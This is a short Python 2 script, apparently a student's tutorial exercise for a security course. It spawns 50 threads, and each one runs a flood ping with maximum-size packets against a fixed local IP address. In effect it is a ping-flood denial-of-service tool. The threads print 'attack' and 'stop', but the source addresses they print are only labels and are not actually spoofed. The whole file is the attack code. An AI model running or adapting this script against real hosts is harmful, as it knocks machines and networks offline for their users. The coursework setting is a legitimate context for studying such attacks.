#Author		: Lim Chee Yeong
#Class		: CSCI262
#Student ID	: J14016414(INTI) or 4933643(UOW)
#Tutorial	: 3
#This program is used to create 49thread and ping an ip address

import os
import thread
import time

def flood(src):
	print src + ",attack"
	os.system('ping -f -i 0.3 -s 65500 -t 255 192.168.1.15')
	print src + ",stop"

for x in range(50):
	src = "192.168.56." + str(x)
	thread.start_new_thread(flood, (src,))
	time.sleep(0.5)